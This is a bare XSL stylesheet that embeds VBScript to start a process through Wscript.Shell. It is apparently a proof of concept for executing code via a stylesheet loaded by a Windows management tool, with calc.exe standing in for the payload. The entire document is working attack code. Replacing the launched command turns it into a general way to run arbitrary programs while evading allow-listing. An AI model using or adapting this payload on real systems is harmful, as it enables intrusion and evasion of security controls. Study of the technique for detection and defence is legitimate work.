<xsl:stylesheet  xmlns:xsl="http://www.w3.org/TR/WD-xsl">
<xsl:script language="VBScript"><![CDATA[
Set shl = CreateObject("Wscript.Shell")  
Call shl.Run("""calc.exe""")  
  ]]></xsl:script>
<xsl:template match="/"><xsl:apply-templates select="//RESULTS"/><xsl:apply-templates select="//INSTANCE"/><xsl:eval no-entities="true" language="VBScript">DisplayValues(this)</xsl:eval></xsl:template>
<xsl:template match="RESULTS"><xsl:eval no-entities="true" language="VBScript">CountResults(this)</xsl:eval></xsl:template>
<xsl:template match="INSTANCE"><xsl:eval language="VBScript">GotInstance()</xsl:eval><xsl:apply-templates select="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"/></xsl:template>
</xsl:stylesheet>
